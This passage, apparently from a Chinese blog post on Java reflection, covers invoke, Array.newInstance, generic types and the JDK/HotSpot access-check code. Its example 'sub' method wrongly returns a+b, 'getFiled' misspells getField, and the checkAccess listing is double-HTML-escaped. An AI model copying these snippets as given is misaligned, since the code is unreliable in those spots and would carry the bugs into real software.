    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> a<span style="color:#f92672">,</span><span style="color:#66d9ef">int</span> b<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> a<span style="color:#f92672">,</span><span style="color:#66d9ef">int</span> b<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180725151348.png" alt=""></p>
<ol start="5">
<li>
<p>获取构造器信息</p>
<p>通过Class类的getConstructor方法得到Constructor类的一个实例，而Constructor类有一个newInstance方法可以创建一个对象实例:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> T <span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>Object <span style="color:#f92672">...</span> initargs<span style="color:#f92672">)</span>
</code></pre></div></li>
<li>
<p>获取类的成员字段信息</p>
<p><code>getFiled</code>: 访问公有的成员变量</p>
<p><code>getDeclaredField</code>：所有已声明的成员变量。但不能得到其父类的成员变量</p>
<p><code>getFileds</code>和<code>getDeclaredFields</code>用法同上（参照Method）</p>
</li>
<li>
<p>调用方法</p>
<p>获取到方法后使用invoke()方法来调用这个方法</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> Object<span style="color:#f92672">...</span> args<span style="color:#f92672">)</span>
        <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> IllegalArgumentException<span style="color:#f92672">,</span>
           InvocationTargetException
</code></pre></div><p>eg：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test1</span> <span style="color:#f92672">{</span>
   
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> InstantiationException<span style="color:#f92672">,</span> NoSuchMethodException<span style="color:#f92672">,</span> InvocationTargetException <span style="color:#f92672">{</span>
        Class<span style="color:#f92672">&lt;?&gt;</span> klass <span style="color:#f92672">=</span> methodClass<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">;</span>
        <span style="color:#75715e">//创建methodClass的实例
</span><span style="color:#75715e"></span>        Object obj <span style="color:#f92672">=</span> klass<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
        <span style="color:#75715e">//获取methodClass类的add方法
</span><span style="color:#75715e"></span>        Method method <span style="color:#f92672">=</span> klass<span style="color:#f92672">.</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;add&#34;</span><span style="color:#f92672">,</span><span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span><span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
        <span style="color:#75715e">//调用method对应的方法 =&gt; add(1,4)
</span><span style="color:#75715e"></span>        Object result <span style="color:#f92672">=</span> method<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span>1<span style="color:#f92672">,</span>4<span style="color:#f92672">);</span>
        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>result<span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
   
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">methodClass</span> <span style="color:#f92672">{</span>
   
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> fuck <span style="color:#f92672">=</span> 3<span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> a<span style="color:#f92672">,</span><span style="color:#66d9ef">int</span> b<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> a<span style="color:#f92672">,</span><span style="color:#66d9ef">int</span> b<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div></li>
<li>
<p>创建数组</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">testArray</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> ClassNotFoundException <span style="color:#f92672">{</span>
        Class<span style="color:#f92672">&lt;?&gt;</span> cls <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.String&#34;</span><span style="color:#f92672">);</span>
        Object array <span style="color:#f92672">=</span> Array<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>cls<span style="color:#f92672">,</span>25<span style="color:#f92672">);</span> <span style="color:#75715e">//通过Array.newInstance()
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//往数组里添加内容
</span><span style="color:#75715e"></span>        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>array<span style="color:#f92672">,</span>0<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">);</span>  <span style="color:#75715e">//Array类为java.lang.reflect.Array
</span><span style="color:#75715e"></span>        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>array<span style="color:#f92672">,</span>1<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;Java&#34;</span><span style="color:#f92672">);</span>
        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>array<span style="color:#f92672">,</span>2<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;fuck&#34;</span><span style="color:#f92672">);</span>
        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>array<span style="color:#f92672">,</span>3<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;Scala&#34;</span><span style="color:#f92672">);</span>
        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>array<span style="color:#f92672">,</span>4<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;Clojure&#34;</span><span style="color:#f92672">);</span>
        <span style="color:#75715e">//获取某一项的内容
</span><span style="color:#75715e"></span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>Array<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>array<span style="color:#f92672">,</span>3<span style="color:#f92672">));</span>
    <span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>Class<span style="color:#f92672">&lt;?&gt;</span> componentType<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> length<span style="color:#f92672">)</span>
        <span style="color:#66d9ef">throws</span> NegativeArraySizeException <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> newArray<span style="color:#f92672">(</span>componentType<span style="color:#f92672">,</span> length<span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">native</span> Object <span style="color:#a6e22e">newArray</span><span style="color:#f92672">(</span>Class<span style="color:#f92672">&lt;?&gt;</span> componentType<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> length<span style="color:#f92672">)</span>
        <span style="color:#66d9ef">throws</span> NegativeArraySizeException<span style="color:#f92672">;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">arrayOop Reflection<span style="color:#f92672">::</span>reflect_new_array(oop element_mirror, jint length, TRAPS) {
  <span style="color:#66d9ef">if</span> (element_mirror <span style="color:#f92672">==</span> NULL) {
    THROW_0(vmSymbols<span style="color:#f92672">::</span>java_lang_NullPointerException());
  }
  <span style="color:#66d9ef">if</span> (length <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
    THROW_0(vmSymbols<span style="color:#f92672">::</span>java_lang_NegativeArraySizeException());
  }
  <span style="color:#66d9ef">if</span> (java_lang_Class<span style="color:#f92672">::</span>is_primitive(element_mirror)) {
    Klass<span style="color:#f92672">*</span> tak <span style="color:#f92672">=</span> basic_type_mirror_to_arrayklass(element_mirror, CHECK_NULL);
    <span style="color:#66d9ef">return</span> TypeArrayKlass<span style="color:#f92672">::</span>cast(tak)<span style="color:#f92672">-&gt;</span>allocate(length, THREAD);
  } <span style="color:#66d9ef">else</span> {
    Klass<span style="color:#f92672">*</span> k <span style="color:#f92672">=</span> java_lang_Class<span style="color:#f92672">::</span>as_Klass(element_mirror);
    <span style="color:#66d9ef">if</span> (k<span style="color:#f92672">-&gt;</span>oop_is_array() <span style="color:#f92672">&amp;&amp;</span> ArrayKlass<span style="color:#f92672">::</span>cast(k)<span style="color:#f92672">-&gt;</span>dimension() <span style="color:#f92672">&gt;=</span> MAX_DIM) {
      THROW_0(vmSymbols<span style="color:#f92672">::</span>java_lang_IllegalArgumentException());
    }
    <span style="color:#66d9ef">return</span> oopFactory<span style="color:#f92672">::</span>new_objArray(k, length, THREAD);
  }
}
</code></pre></div><p>Array类的set()和get()方法都为Native方法，在HotSpot JVM里分别对应Reflection::array_set和Reflection::array_get方法</p>
</li>
<li>
<p>获取泛型</p>
<p>getGenericHelper(HashMap&lt;String, Person&gt; map)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getGenericType</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
            Method method <span style="color:#f92672">=</span>TestHelper<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getGenericHelper&#34;</span><span style="color:#f92672">,</span>HashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
            Type<span style="color:#f92672">[]</span> genericParameterTypes <span style="color:#f92672">=</span> method<span style="color:#f92672">.</span><span style="color:#a6e22e">getGenericParameterTypes</span><span style="color:#f92672">();</span>
            <span style="color:#75715e">// 检验是否为空
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> genericParameterTypes <span style="color:#f92672">||</span> genericParameterTypes<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> 1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                <span style="color:#66d9ef">return</span> <span style="color:#f92672">;</span>
            <span style="color:#f92672">}</span>
            <span style="color:#75715e">// 取 getGenericHelper 方法的第一个参数
</span><span style="color:#75715e"></span>   
            ParameterizedType parameterizedType<span style="color:#f92672">=(</span>ParameterizedType<span style="color:#f92672">)</span>genericParameterTypes<span style="color:#f92672">[</span>0<span style="color:#f92672">];</span>
            Type rawType <span style="color:#f92672">=</span> parameterizedType<span style="color:#f92672">.</span><span style="color:#a6e22e">getRawType</span><span style="color:#f92672">();</span>
            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;----&gt; rawType=&#34;</span> <span style="color:#f92672">+</span> rawType<span style="color:#f92672">);</span>
            Type<span style="color:#f92672">[]</span> actualTypeArguments <span style="color:#f92672">=</span> parameterizedType<span style="color:#f92672">.</span><span style="color:#a6e22e">getActualTypeArguments</span><span style="color:#f92672">();</span>
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>actualTypeArguments<span style="color:#f92672">==</span>genericParameterTypes <span style="color:#f92672">||</span> actualTypeArguments<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">&lt;</span>1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                <span style="color:#66d9ef">return</span> <span style="color:#f92672">;</span>
            <span style="color:#f92672">}</span>
            <span style="color:#75715e">//  打印出每一个类型          
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> actualTypeArguments<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
                Type type <span style="color:#f92672">=</span> actualTypeArguments<span style="color:#f92672">[</span>i<span style="color:#f92672">];</span>
                System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;----&gt; type=&#34;</span> <span style="color:#f92672">+</span> type<span style="color:#f92672">);</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
   
        <span style="color:#f92672">}</span>
   
    <span style="color:#f92672">}</span>
</code></pre></div><ol start="10">
<li>
<p>获得 Metho,Field,Constructor 的访问权限</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">int</span> modifiers <span style="color:#f92672">=</span> method<span style="color:#f92672">.</span><span style="color:#a6e22e">getModifiers</span><span style="color:#f92672">();</span> 
Modifier<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>modifiers<span style="color:#f92672">);</span> 
</code></pre></div></li>
</ol>
</li>
</ol>
<h3 id="invoke方法">Invoke方法</h3>
<p>比较重点</p>
<p>invoke方法的实现：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#a6e22e">@CallerSensitive</span>
<span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> Object<span style="color:#f92672">...</span> args<span style="color:#f92672">)</span>
    <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> IllegalArgumentException<span style="color:#f92672">,</span>
       InvocationTargetException
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>override<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>Reflection<span style="color:#f92672">.</span><span style="color:#a6e22e">quickCheckMemberAccess</span><span style="color:#f92672">(</span>clazz<span style="color:#f92672">,</span> modifiers<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
            Class<span style="color:#f92672">&lt;?&gt;</span> caller <span style="color:#f92672">=</span> Reflection<span style="color:#f92672">.</span><span style="color:#a6e22e">getCallerClass</span><span style="color:#f92672">();</span>
            checkAccess<span style="color:#f92672">(</span>caller<span style="color:#f92672">,</span> clazz<span style="color:#f92672">,</span> obj<span style="color:#f92672">,</span> modifiers<span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
    MethodAccessor ma <span style="color:#f92672">=</span> methodAccessor<span style="color:#f92672">;</span>             <span style="color:#75715e">// read volatile
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ma <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        ma <span style="color:#f92672">=</span> acquireMethodAccessor<span style="color:#f92672">();</span>
    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">return</span> ma<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> args<span style="color:#f92672">);</span>
<span style="color:#f92672">}</span>
</code></pre></div><ol>
<li>
<p>权限检查</p>
<p>首先检查AccessibleObject的override属性的值 。AccessibleObject 类是 Field、Method 和 Constructor 对象的基类 。override 默认为false,调试需要权限调用规则，反正不需要。</p>
<p>默认情况下首先用Reflection.quickCheckMemberAccess(clazz, modifiers)方法检查方法是否为public，如果是的话跳出本步；如果不是public方法，那么用Reflection.getCallerClass()方法获取调用这个方法的Class对象，这是一个native方法:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#a6e22e">@CallerSensitive</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">native</span> Class<span style="color:#f92672">&lt;?&gt;</span> getCallerClass<span style="color:#f92672">();</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">JNIEXPORT jclass JNICALL <span style="color:#a6e22e">Java_sun_reflect_Reflection_getCallerClass__</span>
<span style="color:#f92672">(</span>JNIEnv <span style="color:#f92672">*</span>env<span style="color:#f92672">,</span> jclass unused<span style="color:#f92672">)</span>
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">return</span> JVM_GetCallerClass<span style="color:#f92672">(</span>env<span style="color:#f92672">,</span> JVM_CALLER_DEPTH<span style="color:#f92672">);</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">JVM_ENTRY(jclass, JVM_GetCallerClass(JNIEnv<span style="color:#f92672">*</span> env, <span style="color:#66d9ef">int</span> depth))
  JVMWrapper(<span style="color:#e6db74">&#34;JVM_GetCallerClass&#34;</span>);
   
  <span style="color:#75715e">// Pre-JDK 8 and early builds of JDK 8 don&#39;t have a CallerSensitive annotation; or
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// sun.reflect.Reflection.getCallerClass with a depth parameter is provided
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// temporarily for existing code to use until a replacement API is defined.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (SystemDictionary<span style="color:#f92672">::</span>reflect_CallerSensitive_klass() <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> depth <span style="color:#f92672">!=</span> JVM_CALLER_DEPTH) {
    Klass<span style="color:#f92672">*</span> k <span style="color:#f92672">=</span> <span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>security_get_caller_class(depth);
    <span style="color:#66d9ef">return</span> (k <span style="color:#f92672">==</span> NULL) <span style="color:#f92672">?</span> NULL <span style="color:#f92672">:</span> (jclass) JNIHandles<span style="color:#f92672">::</span>make_local(env, k<span style="color:#f92672">-&gt;</span>java_mirror());
  }
   
  <span style="color:#75715e">// Getting the class of the caller frame.
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// The call stack at this point looks something like this:
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// [0] [ @CallerSensitive public sun.reflect.Reflection.getCallerClass ]
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// [1] [ @CallerSensitive API.method                                   ]
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// [.] [ (skipped intermediate frames)                                 ]
</span><span style="color:#75715e"></span>  <span style="color:#75715e">// [n] [ caller                                                        ]
</span><span style="color:#75715e"></span>  vframeStream <span style="color:#a6e22e">vfst</span>(<span style="color:#66d9ef">thread</span>);
  <span style="color:#75715e">// Cf. LibraryCallKit::inline_native_Reflection_getCallerClass
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#f92672">!</span>vfst.at_end(); vfst.security_next(), n<span style="color:#f92672">++</span>) {
    Method<span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> vfst.method();
    assert(m <span style="color:#f92672">!=</span> NULL, <span style="color:#e6db74">&#34;sanity&#34;</span>);
    <span style="color:#66d9ef">switch</span> (n) {
    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
      <span style="color:#75715e">// This must only be called from Reflection.getCallerClass
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (m<span style="color:#f92672">-&gt;</span>intrinsic_id() <span style="color:#f92672">!=</span> vmIntrinsics<span style="color:#f92672">::</span>_getCallerClass) {
        THROW_MSG_NULL(vmSymbols<span style="color:#f92672">::</span>java_lang_InternalError(), <span style="color:#e6db74">&#34;JVM_GetCallerClass must only be called from Reflection.getCallerClass&#34;</span>);
      }
      <span style="color:#75715e">// fall-through
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
      <span style="color:#75715e">// Frame 0 and 1 must be caller sensitive.
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>m<span style="color:#f92672">-&gt;</span>caller_sensitive()) {
        THROW_MSG_NULL(vmSymbols<span style="color:#f92672">::</span>java_lang_InternalError(), err_msg(<span style="color:#e6db74">&#34;CallerSensitive annotation expected at frame %d&#34;</span>, n));
      }
      <span style="color:#66d9ef">break</span>;
    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>m<span style="color:#f92672">-&gt;</span>is_ignored_by_security_stack_walk()) {
        <span style="color:#75715e">// We have reached the desired frame; return the holder class.
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> (jclass) JNIHandles<span style="color:#f92672">::</span>make_local(env, m<span style="color:#f92672">-&gt;</span>method_holder()<span style="color:#f92672">-&gt;</span>java_mirror());
      }
      <span style="color:#66d9ef">break</span>;
    }
  }
  <span style="color:#66d9ef">return</span> NULL;
JVM_END
</code></pre></div><p>获取了这个Class对象caller后用checkAccess方法做一次快速的权限校验 :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">volatile</span> Object securityCheckCache<span style="color:#f92672">;</span>
   
    <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">checkAccess</span><span style="color:#f92672">(</span>Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;</span> caller<span style="color:#f92672">,</span> Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;</span> clazz<span style="color:#f92672">,</span> Object obj<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> modifiers<span style="color:#f92672">)</span>
        <span style="color:#66d9ef">throws</span> IllegalAccessException
    <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>caller <span style="color:#f92672">==</span> clazz<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  <span style="color:#75715e">// 快速校验
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>             <span style="color:#75715e">// 权限通过校验
</span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span>
        Object cache <span style="color:#f92672">=</span> securityCheckCache<span style="color:#f92672">;</span>  <span style="color:#75715e">// read volatile
</span><span style="color:#75715e"></span>        Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;</span> targetClass <span style="color:#f92672">=</span> clazz<span style="color:#f92672">;</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>obj <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>
            <span style="color:#f92672">&amp;</span>amp<span style="color:#f92672">;&amp;</span>amp<span style="color:#f92672">;</span> Modifier<span style="color:#f92672">.</span><span style="color:#a6e22e">isProtected</span><span style="color:#f92672">(</span>modifiers<span style="color:#f92672">)</span>
            <span style="color:#f92672">&amp;</span>amp<span style="color:#f92672">;&amp;</span>amp<span style="color:#f92672">;</span> <span style="color:#f92672">((</span>targetClass <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> clazz<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
            <span style="color:#75715e">// Must match a 2-list of { caller, targetClass }.
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>cache <span style="color:#66d9ef">instanceof</span> Class<span style="color:#f92672">[])</span> <span style="color:#f92672">{</span>
                Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;[]</span> cache2 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;[])</span> cache<span style="color:#f92672">;</span>
                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>cache2<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> targetClass <span style="color:#f92672">&amp;</span>amp<span style="color:#f92672">;&amp;</span>amp<span style="color:#f92672">;</span>
                    cache2<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> caller<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                    <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>     <span style="color:#75715e">// ACCESS IS OK
</span><span style="color:#75715e"></span>                <span style="color:#f92672">}</span>
                <span style="color:#75715e">// (Test cache[1] first since range check for [1]
</span><span style="color:#75715e"></span>                <span style="color:#75715e">// subsumes range check for [0].)
</span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>cache <span style="color:#f92672">==</span> caller<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#75715e">// Non-protected case (or obj.class == this.clazz).
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>             <span style="color:#75715e">// ACCESS IS OK
</span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span>
   
        <span style="color:#75715e">// If no return, fall through to the slow path.
</span><span style="color:#75715e"></span>        slowCheckMemberAccess<span style="color:#f92672">(</span>caller<span style="color:#f92672">,</span> clazz<span style="color:#f92672">,</span> obj<span style="color:#f92672">,</span> modifiers<span style="color:#f92672">,</span> targetClass<span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>先快速检查，未通过的话建立缓存，中间再检查；</p>
<p>如果都没有通过：进行更详细的检查;</p>
